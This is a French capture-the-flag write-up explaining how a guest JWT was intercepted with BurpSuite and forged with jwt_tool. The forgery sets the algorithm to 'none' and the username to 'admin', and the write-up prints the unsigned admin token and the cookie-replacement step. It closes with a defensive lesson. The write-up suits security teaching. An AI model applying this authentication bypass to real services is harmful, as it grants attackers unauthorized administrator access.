# JWT - Introduction - Write-up

## Contexte 📝

Dans ce challenge, l’objectif est de se connecter en tant qu'**admin** en exploitant un JWT mal configuré. Vous commencez par vous connecter en tant que **guest** et utilisez **BurpSuite** pour intercepter un cookie contenant un JWT. Vous allez ensuite manipuler ce jeton pour vous connecter en tant qu'administrateur.

---

## Étape 1 : Analyse du JWT 🧐

D’abord, vous interceptez le cookie **JWT** dans votre navigateur avec BurpSuite. Voici à quoi il ressemble :
```


jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk



```yaml
Ce JWT est composé de trois parties : 
1. **Header** : Contient le type du jeton et l'algorithme de signature utilisé.
2. **Payload** : Contient les données (dans ce cas, le nom d'utilisateur).
3. **Signature** : Une signature numérique pour vérifier l'intégrité du jeton.

---

## Étape 2 : Décryptage du JWT avec `jwt_tool` 🔓

Vous utilisez l'outil **jwt_tool** pour analyser et manipuler le JWT. D'abord, clonez le dépôt :

```bash
git clone https://github.com/ticarpi/jwt_tool.git
```


Ensuite, lancez l'outil avec la commande suivante pour déchiffrer le jeton :



```bash
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
```


Cela vous donne la sortie suivante :



```markdown
=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] username = guest
```

Ici, on voit que le **username**  est `guest` et l'algorithme utilisé est `HS256`. Cela confirme que c’est un jeton JWT classique avec un algorithme de signature basé sur un secret partagé.


---



## Étape 3 : Manipulation du JWT pour changer l'utilisateur 🛠️ 


Ensuite, nous allons manipuler le jeton pour modifier l’algorithme de signature et le nom d'utilisateur.


### Modification de l'algorithme 

 
2. Sélectionnez l'option pour manipuler le jeton :



```bash
1: Tamper with JWT data
```

 
2. Changez l'algorithme de signature de `HS256` à `none` (ce qui permet de supprimer la signature) :



```ini
alg = none
```


### Modification du nom d'utilisateur 

 
2. Vous modifiez ensuite le **payload**  pour remplacer `guest` par `admin` :



```ini
username = admin
```



---



## Étape 4 : Signature sans clé 🎯 

Maintenant, comme nous avons modifié l'algorithme en `none`, nous n’avons pas besoin de fournir une signature valide. Nous sélectionnons donc l’option :


```cpp
3: Strip signature using the "none" algorithm
```


Cela génère un jeton sans signature valide :



```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
```



---



## Étape 5 : Utilisation du jeton modifié 💻 

Maintenant que nous avons notre **nouveau jeton** , il vous suffit de remplacer le cookie JWT dans BurpSuite lorsque vous êtes connecté en tant que **guest** .
Cela vous permettra de vous connecter en tant qu'**admin** . Vous pourrez alors valider le challenge avec le flag.

### Flag : 



```markdown
S1gn4*************************Rt4n7
```



---



## Conclusion 🎉 

Ce challenge illustre une vulnérabilité**  typique des JWT mal configurés, où un algorithme de signature comme `none` permet à un attaquant de manipuler**  facilement les jetons pour s'authentifier avec un autre rôle. La leçon ici est que l'algorithme de signature doit toujours être sécurisé et ne pas permettre l'option `none` à moins d'avoir une gestion stricte des clés.
Un jeton JWT**  correctement configuré et signé avec un algorithme sécurisé (comme HS256**  ou RS256** ) est essentiel